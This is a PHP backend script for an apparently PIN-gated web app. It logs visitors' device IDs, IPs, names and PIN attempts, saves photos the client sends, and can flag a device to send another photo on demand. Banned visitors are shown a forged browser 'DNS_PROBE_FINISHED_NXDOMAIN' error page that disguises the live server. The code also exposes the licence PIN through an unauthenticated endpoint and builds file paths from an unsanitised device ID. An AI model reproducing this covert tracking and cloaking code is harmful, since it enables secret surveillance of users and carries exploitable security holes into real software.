<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Reliable IP Detection
$ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : (isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown'));
if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
    $ips = explode(',', $ip);
    $ip = trim($ips[0]);
}

function isBanned($deviceId, $ip) {
    $bannedDevicesFile = __DIR__ . '/banned_devices.txt';
    $bannedIpsFile = __DIR__ . '/banned_ips.txt';
    
    if (isset($_COOKIE['banned']) && $_COOKIE['banned'] === '1') {
        if ($deviceId !== 'unknown' && $deviceId !== '') {
            $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
            $bannedDevices = array_map('trim', $bannedDevices);
            if (!in_array($deviceId, $bannedDevices, true)) {
                @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
            }
        }
        return true;
    }

    if ($deviceId !== 'unknown' && $deviceId !== '' && file_exists($bannedDevicesFile)) {
        $banned = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $banned = array_map('trim', $banned);
        if (in_array($deviceId, $banned, true)) {
            if (!isset($_COOKIE['banned'])) setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
            return true;
        }
    }

    if ($ip !== 'unknown' && $ip !== '' && file_exists($bannedIpsFile)) {
        $banned = file($bannedIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $banned = array_map('trim', $banned);
        if (in_array($ip, $banned, true)) {
            if (!isset($_COOKIE['banned'])) setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
            return true;
        }
    }
    return false;
}

function showBannedPage($host) {
    http_response_code(403);
    echo "<!-- DEVICE_BANNED -->";
    ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Site Can't Be Reached</title>
    <style>
        body { background-color: #f1f1f1; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .icon { width: 72px; height: 72px; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyNsAAAABlBMVEUAAAD///+l2Z/dAAAAMklEQVR4AWMYBYJBAAEDYwADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDYwABygE+m2vFmAAAAABJRU5ErkJggg=='); background-repeat: no-repeat; margin-bottom: 40px; }
        h1 { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 20px; }
        p { font-size: 14px; line-height: 20px; margin-bottom: 10px; }
        .error-code { margin-top: 30px; font-size: 12px; text-transform: uppercase; }
        ul { margin-top: 10px; padding-left: 20px; }
        li { margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon"></div>
        <h1>This site can't be reached</h1>
        <p>Check if there is a typo in <strong><?php echo htmlspecialchars($host); ?></strong>.</p>
        <ul>
            <li>If spelling is correct, try running Windows Network Diagnostics.</li>
        </ul>
        <div class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
    </div>
</body>
</html>
    <?php
    exit;
}

// === GET LICENCE PIN ===
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'getLicencePin') {
    $configFile = __DIR__ . '/.admin_config.json';
    $config = file_exists($configFile) ? json_decode(file_get_contents($configFile), true) : [];
    $pin = isset($config['licence_pin']) ? $config['licence_pin'] : '4575';
    header('Content-Type: application/json');
    echo json_encode(['pin' => $pin]);
    exit;
}

// === CHECK BAN (Early check) ===
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'checkBan') {
    $deviceId = isset($_GET['deviceId']) ? trim($_GET['deviceId']) : '';
    if (isBanned($deviceId, $ip)) {
        showBannedPage($_SERVER['HTTP_HOST']);
    } else {
        if (isset($_COOKIE['banned'])) setcookie('banned', '', time() - 3600, "/");
    }
    http_response_code(200);
    echo "OK";
    exit;
}

// === NORMAL LOGGING ===
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);
if (!$data) {
    $data = isset($_GET) ? $_GET : [];
}

$deviceId = isset($data['deviceId']) ? trim($data['deviceId']) : 'unknown';

if (isBanned($deviceId, $ip)) {
    showBannedPage($_SERVER['HTTP_HOST']);
}

$timestamp = date('Y-m-d H:i:s');
$event       = isset($data['event']) ? $data['event'] : 'unknown';
$success     = (isset($data['success']) && ($data['success'] === true || $data['success'] === 'true' || $data['success'] === 1)) ? true : false;
$pin_attempt = isset($data['pin_attempt']) ? $data['pin_attempt'] : '—';
$name        = isset($data['name']) ? $data['name'] : '—';

// Photo Handling Optimization
$photo_updated = false;
if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
    $photosDir = __DIR__ . '/photos';
    if (!is_dir($photosDir)) @mkdir($photosDir, 0777, true);
    
    $photoData = $data['photo'];
    if (strpos($photoData, 'data:image') === 0) {
        $photoData = substr($photoData, strpos($photoData, ',') + 1);
    }
    $decodedPhoto = base64_decode($photoData);
    if ($decodedPhoto) {
        $photo_path = $photosDir . '/' . $deviceId . '.jpg';
        file_put_contents($photo_path, $decodedPhoto);
        $photo_updated = true;
    }
}

// 1. Update Latest State
$stateFile  = __DIR__ . '/latest_state.json';
$state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
if (!is_array($state)) $state = [];

$request_photo = false;

if ($deviceId !== 'unknown') {
    if (!isset($state[$deviceId])) {
        $state[$deviceId] = [
            'deviceId' => $deviceId,
            'ip' => $ip,
            'timestamp' => $timestamp,
            'event' => $event,
            'success' => $success ? 'YES' : 'NO',
            'pin_attempt' => $pin_attempt,
            'name' => $name,
            'last_seen' => $timestamp,
            'failed_attempts' => 0
        ];
    } else {
        $state[$deviceId]['ip'] = $ip;
        $state[$deviceId]['timestamp'] = $timestamp;
        $state[$deviceId]['event'] = $event;
        $state[$deviceId]['success'] = ($success || ($state[$deviceId]['success'] ?? 'NO') === 'YES') ? 'YES' : 'NO';
        if ($pin_attempt !== '—') $state[$deviceId]['pin_attempt'] = $pin_attempt;
        if ($name !== '—') $state[$deviceId]['name'] = $name;
        $state[$deviceId]['last_seen'] = $timestamp;
        
        // Check for photo request
        if (!empty($state[$deviceId]['request_photo'])) {
            $request_photo = true;
            // Clear flag if photo was just provided
            if ($photo_updated || $event === 'photo_response') {
                $state[$deviceId]['request_photo'] = false;
                $request_photo = false;
            }
        }
    }

    // Auto-ban logic
    if ($event === 'pin_failed') {
        $state[$deviceId]['failed_attempts'] = ($state[$deviceId]['failed_attempts'] ?? 0) + 1;
        if ($state[$deviceId]['failed_attempts'] >= 10) {
            $bannedDevicesFile = __DIR__ . '/banned_devices.txt';
            $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
            $bannedDevices = array_map('trim', $bannedDevices);
            if (!in_array($deviceId, $bannedDevices, true)) {
                @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
            }
            setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
        }
    } elseif ($event === 'pin_success') {
        $state[$deviceId]['failed_attempts'] = 0;
    }

    @file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
}

// 2. Append to Visits History
$visitsLog = __DIR__ . '/visits.log';
$visitEntry = [
    'timestamp' => $timestamp,
    'deviceId' => $deviceId,
    'ip' => $ip,
    'event' => $event,
    'success' => $success,
    'pin_attempt' => $pin_attempt,
    'name' => $name,
    'photoChanged' => $photo_updated || (isset($data['photoChanged']) && $data['photoChanged'])
];
@file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND);

header('Content-Type: application/json');
echo json_encode([
    "status" => "ok",
    "request_photo" => $request_photo
]);
?>
